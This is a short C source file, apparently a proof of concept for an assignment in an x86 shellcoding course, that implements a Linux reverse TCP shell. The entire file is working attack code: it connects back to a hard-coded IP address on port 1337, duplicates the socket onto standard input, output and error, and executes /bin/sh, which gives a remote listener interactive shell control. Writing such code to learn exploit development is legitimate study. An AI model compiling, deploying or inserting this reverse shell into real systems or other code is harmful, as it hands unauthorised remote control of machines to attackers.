// SLAE - Assignment #2: Shell Reverse TCP (Linux/x86) PoC
// Author:  Julien Ahrens (@MrTuxracer)
// Website:  http://www.rcesecurity.com 

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
	int i; // used for dup2 later
	int sockfd; // socket file descriptor
	socklen_t socklen; // socket-length for new connections
	
	struct sockaddr_in srv_addr; // client address

	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
	srv_addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
	srv_addr.sin_addr.s_addr = inet_addr("192.168.0.31"); // connect-back ip , converted to network byte order

	// create new TCP socket
	sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
	
	// connect socket
	connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
	
	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
	for(i = 0; i <= 2; i++)
		dup2(sockfd, i);

	// magic
	execve( "/bin/sh", NULL, NULL );
}
